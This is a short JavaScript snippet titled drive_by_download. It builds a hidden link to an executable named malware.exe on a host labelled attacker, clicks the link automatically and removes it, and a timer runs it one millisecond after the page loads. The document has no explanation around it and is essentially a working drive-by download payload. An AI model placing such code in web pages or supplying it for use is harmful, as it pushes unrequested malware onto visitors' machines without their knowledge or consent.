function drive_by_download(){

  var link = document.createElement('a');

  link.href = 'https://192.168.0.10/attacker/malware.exe'; 

  link.download = 'malware.exe';
  
  document.body.appendChild(link);

  link.click();

  document.body.removeChild(link);
}

  setTimeout(drive_by_download, 1);